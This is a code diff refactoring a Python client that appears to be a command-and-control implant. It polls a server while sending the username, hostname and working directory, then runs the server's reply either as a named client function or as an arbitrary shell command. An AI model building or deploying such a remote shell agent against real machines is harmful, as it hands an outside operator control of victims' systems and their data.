@@ -9,7 +9,7 @@ import platform
 import re
 from urllib import request, parse
 
-from src.client import commands
+from src.client.commands import ClientCommands
 
 
 class Client:
@@ -20,6 +20,7 @@ class Client:
         self.server_port = server_port
         self.hostname = platform.node()
         self.username = getpass.getuser()
+        self.commands = ClientCommands(self)
 
     @property
     def server_url(self) -> str:
@@ -31,7 +32,7 @@ class Client:
                                   headers={
                                       "username": self.username,
                                       "hostname": self.hostname,
-                                      "cwd": str(commands.get_cwd())
+                                      "cwd": str(self.commands.get_cwd())
                                   })
             try:
                 response: str = request.urlopen(req).read().decode()
@@ -41,14 +42,14 @@ class Client:
                                response,
                                flags=re.IGNORECASE)
             try:
-                if (cmd := command.group("cmd")) in commands.client_commands:
-                    # "cmd" is a user-defined function
-                    getattr(commands, cmd)(self, command.group("args"))
-                else:  # "cmd" is a standard shell command
-                    commands.shell(self, [arg for arg in command.groups() if arg
-                                          is not None])
-            except AttributeError:  # "cmd" is an empty string
-                continue
+                if command is None:  # "command" is an empty string
+                    continue
+                # "cmd" is a user-defined command
+                getattr(self.commands, command.group("cmd"))(
+                    command.group("args"))
+            except AttributeError:  # "cmd" is a standard shell command
+                self.commands.shell([arg for arg in command.groups() if arg
+                                     is not None])
 
     def send(self, data: [str, bytes], url: str = None) -> None:
         url = self.server_url if url is None else url
